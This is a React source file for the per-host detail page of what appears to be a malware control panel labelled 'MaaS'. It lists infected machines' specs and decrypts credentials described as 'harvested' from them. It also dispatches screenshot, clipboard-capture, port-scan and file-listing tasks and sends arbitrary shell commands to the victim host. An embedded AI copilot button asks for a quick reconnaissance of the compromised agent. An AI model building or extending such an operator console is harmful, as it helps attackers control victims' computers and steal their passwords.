import { useState } from 'react'
import { useParams, useNavigate } from 'react-router-dom'
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query'
import { motion } from 'framer-motion'
import { useAgent } from '../hooks/useAgents'
import { useTasks } from '../hooks/useTasks'
import { createTask } from '../api/tasks'
import {
  ChevronLeft, Camera, Keyboard, Terminal, Wifi, Monitor, Eye, EyeOff,
  HardDrive, User, Globe, Clock, Cpu, Shield, FileText, Folder, KeyRound,
  PlayCircle, Shell, ScanLine, MousePointerClick, Sparkles
} from 'lucide-react'
import { useCopilotStore } from '../stores/copilotStore'
import { searchCredentials, revealCredential } from '../api/credentials'
import api from '../api/client'
import { Card, CardBody, CardHeader, CardMetric } from '../components/ui/Card'
import { StatusBadge } from '../components/ui/StatusBadge'
import { TaskCard, TaskLike } from '../components/ui/TaskCard'
import { QuickAction } from '../components/ui/QuickAction'
import { MaaSBreadcrumb, ViewLabel } from '../components/ui/MaaSBreadcrumb'
import { PageTransition } from '../components/ui/PageTransition'
import { useToast } from '../contexts/ToastContext'

const container = { hidden: { opacity: 0 }, show: { opacity: 1, transition: { staggerChildren: 0.05 } } }
const itemFade = { hidden: { opacity: 0, y: 10 }, show: { opacity: 1, y: 0 } }

type Tab = 'tasks' | 'credentials' | 'files' | 'terminal'

export default function AgentDetail() {
  const { id } = useParams<{ id: string }>()
  const navigate = useNavigate()
  const qc = useQueryClient()
  const { data: agent, isLoading } = useAgent(id!)
  const { data: tasks = [] } = useTasks({ agent_id: id })
  const [tab, setTab] = useState<Tab>('tasks')
  const [cmd, setCmd] = useState('')
  const [revealedCreds, setRevealedCreds] = useState<Record<string, string>>({})

  const toast = useToast()

  const createMut = useMutation({
    mutationFn: createTask,
    onSuccess: () => {
      qc.invalidateQueries({ queryKey: ['tasks'] })
      toast.addToast({ type: 'success', title: 'Task dispatched', message: 'The task has been queued for this agent.' })
    },
    onError: (err: any) => {
      toast.addToast({ type: 'error', title: 'Dispatch failed', message: err?.message || 'Could not create task.' })
    },
  })

  const { data: agentCreds = [] } = useQuery({
    queryKey: ['credentials', id],
    queryFn: () => searchCredentials({ agent_id: id, limit: 200 }),
    enabled: tab === 'credentials',
  })

  const { data: fileEvents = [] } = useQuery({
    queryKey: ['file-events', id],
    queryFn: () => api.get<any[]>(`/files?agent_id=${id}`).then(r => r.data).catch(() => []),
    enabled: tab === 'files',
  })

  const toggleReveal = async (credId: string) => {
    if (revealedCreds[credId]) {
      setRevealedCreds(prev => { const n = { ...prev }; delete n[credId]; return n })
      return
    }
    try {
      const revealed = await revealCredential(credId)
      setRevealedCreds(prev => ({ ...prev, [credId]: revealed.password ?? '—' }))
    } catch {
      toast.addToast({ type: 'error', title: 'Reveal failed', message: 'Could not decrypt credential.' })
    }
  }

  const runQuick = (module: string, action = 'run', params = {}) => {
    createMut.mutate({ agent_id: id, module, action, params, priority: 'normal' } as any)
  }

  const cancelTask = (task: TaskLike) => {
    api.delete(`/tasks/${task.id}`)
      .then(() => {
        qc.invalidateQueries({ queryKey: ['tasks'] })
        toast.addToast({ type: 'info', title: 'Task cancelled', message: `${task.module} › ${task.action}` })
      })
      .catch((err: any) => {
        toast.addToast({ type: 'error', title: 'Cancel failed', message: err?.message || 'Could not cancel task.' })
      })
  }

  if (isLoading) return <div className="flex justify-center py-20"><span className="loading loading-spinner loading-lg text-success" /></div>
  if (!agent) return (
    <PageTransition>
      <div className="page-container"><p className="text-error">Agent not found.</p></div>
    </PageTransition>
  )

  const lastSeen = agent.last_seen ? new Date(agent.last_seen).toLocaleString() : '—'
  const ramTotal = agent.ram_total ? `${(agent.ram_total / 1024 / 1024 / 1024).toFixed(1)} GB` : '—'
  const ramFree = agent.ram_available ? `${(agent.ram_available / 1024 / 1024 / 1024).toFixed(1)} GB` : '—'

  return (
    <PageTransition>
      <div className="page-container space-y-6">
        <div className="flex flex-col md:flex-row md:items-end justify-between gap-4">
          <div className="space-y-2">
            <MaaSBreadcrumb
              macro={{ label: 'Dashboard', to: '/' }}
              micro={{ label: agent.hostname, to: `/agents/${agent.id}` }}
            />
            <ViewLabel type="micro" label={agent.hostname} />
          </div>
          <div className="flex gap-2">
            <button className="btn btn-ghost btn-sm gap-1" onClick={() => navigate(-1)}><ChevronLeft size={14} /> Back</button>
            <motion.button
              whileHover={{ scale: 1.03 }}
              whileTap={{ scale: 0.97 }}
              className="btn btn-sm btn-success gap-2"
              onClick={() => navigate(`/remote/${id}`)}
            >
              <Monitor size={15} /> Remote Desktop
            </motion.button>
          </div>
        </div>

        <Card className="p-5" hover={false}>
          <div className="flex flex-col md:flex-row md:items-center gap-6">
            <div className="w-16 h-16 rounded-2xl bg-base-300 flex items-center justify-center text-3xl shrink-0">
              {(agent.os || '').toLowerCase().includes('win') ? '🪟' : (agent.os || '').toLowerCase().includes('darwin') ? '🍎' : '🐧'}
            </div>
            <div className="flex-1 min-w-0">
              <div className="flex items-center gap-3 mb-1">
                <h2 className="text-xl font-bold truncate">{agent.hostname}</h2>
                <StatusBadge status={agent.status} />
              </div>
              <p className="text-sm text-base-content/60 font-mono truncate">{agent.ip_public || agent.ip_private || 'no ip'} · {agent.os} · {agent.username}</p>
            </div>
            <div className="grid grid-cols-3 gap-3 text-center">
              <Metric label="Status" value={<span className="capitalize">{agent.status}</span>} />
              <Metric label="Last Seen" value={lastSeen} small />
              <Metric label="Tasks" value={tasks.length} />
            </div>
          </div>
        </Card>

        <section>
          <h3 className="text-sm font-bold uppercase tracking-wider text-base-content/50 mb-3">System Specs</h3>
          <motion.div variants={container} initial="hidden" animate="show" className="grid grid-cols-2 md:grid-cols-4 gap-3">
            <motion.div variants={itemFade}><Card hover className="p-4"><CardMetric value={agent.username || '—'} label="User" /></Card></motion.div>
            <motion.div variants={itemFade}><Card hover className="p-4"><CardMetric value={agent.architecture || '—'} label="Architecture" /></Card></motion.div>
            <motion.div variants={itemFade}><Card hover className="p-4"><CardMetric value={agent.processor || '—'} label="Processor" /></Card></motion.div>
            <motion.div variants={itemFade}><Card hover className="p-4"><CardMetric value={ramTotal} label="RAM Total" trend={ramFree + ' free'} /></Card></motion.div>
            <motion.div variants={itemFade}><Card hover className="p-4"><CardMetric value={agent.ip_public || '—'} label="Public IP" /></Card></motion.div>
            <motion.div variants={itemFade}><Card hover className="p-4"><CardMetric value={agent.ip_private || '—'} label="Private IP" /></Card></motion.div>
            <motion.div variants={itemFade}><Card hover className="p-4"><CardMetric value={agent.created_at ? new Date(agent.created_at).toLocaleDateString() : '—'} label="Created" /></Card></motion.div>
            <motion.div variants={itemFade}><Card hover className="p-4"><CardMetric value={lastSeen} label="Last Seen" /></Card></motion.div>
          </motion.div>
        </section>

        <section>
          <h3 className="text-sm font-bold uppercase tracking-wider text-base-content/50 mb-3">Fast Actions</h3>
          <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
            <QuickAction icon={Camera} label="Screenshot" description="Capture screen" color="info" onClick={() => runQuick('screenshot', 'capture')} />
            <QuickAction icon={Shell} label="Shell" description="Open agent shell" color="success" onClick={() => setTab('terminal')} />
            <QuickAction icon={ScanLine} label="Port Scan" description="Scan target ports" color="info" onClick={() => runQuick('port_scan', 'scan', { host: '127.0.0.1', ports: [22, 80, 443, 445] })} />
            <QuickAction icon={MousePointerClick} label="Clipboard" description="Read clipboard" color="ghost" onClick={() => runQuick('clipboard', 'capture')} />
            <QuickAction icon={FileText} label="List Files" description="Enumerate directory" color="ghost" onClick={() => runQuick('file', 'list', { path: '.' })} />
            <QuickAction icon={Wifi} label="Network Info" description="List interfaces" color="ghost" onClick={() => runQuick('wifi', 'scan')} />
          </div>
          {/* Copilot contextual launch */}
          <div className="mt-3 flex items-center gap-2 p-2.5 rounded-xl bg-success/5 border border-success/20">
            <Sparkles size={16} className="text-success shrink-0" />
            <span className="text-xs text-base-content/60 flex-1">Analyser cet agent avec l'IA Copilot</span>
            <button
              className="btn btn-xs btn-success gap-1"
              onClick={() => useCopilotStore.getState().openWithMessage(`Fais un recon express de l'agent ${agent?.hostname || 'cet agent'} (id: ${agent?.id}). Analyse le système, prends un screenshot, vérifie le réseau et dis-moi ce que tu trouves.`)}
            >
              <Sparkles size={10} /> Analyser
            </button>
          </div>
        </section>

        <section>
          <div className="flex items-center gap-3 mb-4 overflow-x-auto pb-1">
            {([
              { key: 'tasks', label: 'Tasks', icon: PlayCircle, count: tasks.length },
              { key: 'credentials', label: 'Credentials', icon: KeyRound, count: agentCreds.length },
              { key: 'files', label: 'Files', icon: Folder, count: fileEvents.length },
              { key: 'terminal', label: 'Terminal', icon: Terminal, count: undefined },
            ] as const).map((t) => (
              <button
                key={t.key}
                onClick={() => setTab(t.key)}
                className={`flex items-center gap-2 px-4 py-2 rounded-xl text-sm font-medium transition-all ${
                  tab === t.key
                    ? 'bg-success/10 text-success border border-success/20 shadow-sm'
                    : 'bg-base-200 text-base-content/60 border border-transparent hover:bg-base-300'
                }`}
              >
                <t.icon size={14} /> {t.label}
                {typeof t.count === 'number' && <span className="text-[10px] bg-base-300 px-1.5 py-0.5 rounded-md">{t.count}</span>}
              </button>
            ))}
          </div>

          <motion.div
            key={tab}
            initial={{ opacity: 0, x: 10 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: -10 }}
            transition={{ duration: 0.2 }}
          >
            {tab === 'tasks' && (
              <div className="space-y-3">
                <div className="flex items-center justify-between">
                  <h3 className="font-bold text-sm">Task History</h3>
                  <button className="btn btn-xs btn-success gap-1" onClick={() => setTab('terminal')}><Shell size={12} /> New Task</button>
                </div>
                {tasks.length === 0 && <p className="text-base-content/40 text-sm py-8 text-center">No tasks yet. Open the Terminal tab to run one.</p>}
                <div className="grid grid-cols-1 lg:grid-cols-2 gap-3">
                  {tasks.map((t: any) => (
                    <div key={t.id} onClick={() => navigate(`/tasks/${t.id}`)} className="cursor-pointer">
                      <TaskCard
                        task={t}
                        onCancel={cancelTask}
                        onRerun={(task) => runQuick(task.module, task.action, task.params || {})}
                      />
                    </div>
                  ))}
                </div>
              </div>
            )}

            {tab === 'credentials' && (
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                {agentCreds.length === 0 && (
                  <div className="col-span-full text-center text-base-content/40 py-8 text-sm">No credentials harvested from this agent yet.</div>
                )}
                {agentCreds.map((c: any) => (
                  <Card key={c.id} hover className="p-4">
                    <div className="flex items-start justify-between mb-2">
                      <div className="min-w-0">
                        <p className="text-xs text-base-content/50 truncate">{c.url || c.hostname || '—'}</p>
                        <p className="font-bold font-mono truncate">{c.username}</p>
                      </div>
                      <span className={`badge badge-xs ${c.confidence === 'high' ? 'badge-error' : c.confidence === 'medium' ? 'badge-warning' : 'badge-ghost'}`}>{c.confidence}</span>
                    </div>
                    <div className="flex items-center gap-2 p-2 rounded-lg bg-base-300/50">
                      <span className="font-mono text-sm">{revealedCreds[c.id] ? (revealedCreds[c.id].slice(0, 30) + '…') : '••••••••'}</span>
                      <button onClick={() => toggleReveal(c.id)} className="btn btn-ghost btn-xs p-0 ml-auto">
                        {revealedCreds[c.id] ? <EyeOff size={12}/> : <Eye size={12}/>}
                      </button>
                    </div>
                    <p className="text-[10px] text-base-content/40 mt-2">{c.source} · {c.captured_at ? new Date(c.captured_at).toLocaleString() : '—'}</p>
                  </Card>
                ))}
              </div>
            )}

            {tab === 'files' && (
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                {fileEvents.length === 0 && (
                  <div className="col-span-full text-center text-base-content/40 py-8 text-sm">No file events recorded for this agent.</div>
                )}
                {fileEvents.map((f: any) => (
                  <Card key={f.id} hover className="p-4">
                    <div className="flex items-center gap-3 mb-2">
                      <div className="p-2 rounded-lg bg-base-300"><Folder size={16} className="text-success" /></div>
                      <div className="min-w-0">
                        <p className="text-xs font-mono truncate">{f.path}</p>
                        <p className="text-[10px] text-base-content/50">{f.action} · {f.size ? `${(f.size/1024).toFixed(1)} KB` : '—'}</p>
                      </div>
                    </div>
                    <p className="text-[10px] text-base-content/40 font-mono truncate">{f.hash?.slice(0,16) || '—'}</p>
                    <p className="text-[10px] text-base-content/40 mt-1">{f.timestamp ? new Date(f.timestamp).toLocaleString() : '—'}</p>
                  </Card>
                ))}
              </div>
            )}

            {tab === 'terminal' && (
              <Card className="p-4" hover={false}>
                <CardHeader className="px-0 pt-0">
                  <h3 className="font-bold text-sm flex items-center gap-2"><Terminal size={14} /> Shell</h3>
                  <span className="text-[10px] text-base-content/40 font-mono">lucy@{agent.hostname}</span>
                </CardHeader>
                <div className="flex gap-2 mt-2">
                  <span className="font-mono text-success text-sm">$</span>
                  <input
                    className="input input-sm input-bordered flex-1 font-mono"
                    value={cmd}
                    onChange={(e) => setCmd(e.target.value)}
                    onKeyDown={(e) => {
                      if (e.key === 'Enter' && cmd) {
                        runQuick('shell', 'exec', { cmd })
                        setCmd('')
                      }
                    }}
                    placeholder="type command and press Enter…"
                  />
                </div>
                <p className="text-[10px] text-base-content/40 mt-2">Press Enter to dispatch. The result will appear in the Tasks tab.</p>
              </Card>
            )}
          </motion.div>
        </section>
      </div>
    </PageTransition>
  )
}

function Metric({ label, value, small }: { label: string; value: React.ReactNode; small?: boolean }) {
  return (
    <div className="px-3">
      <p className="text-[10px] uppercase tracking-wider text-base-content/40">{label}</p>
      <div className={`font-semibold ${small ? 'text-[11px] font-mono' : 'text-sm'}`}>{value}</div>
    </div>
  )
}
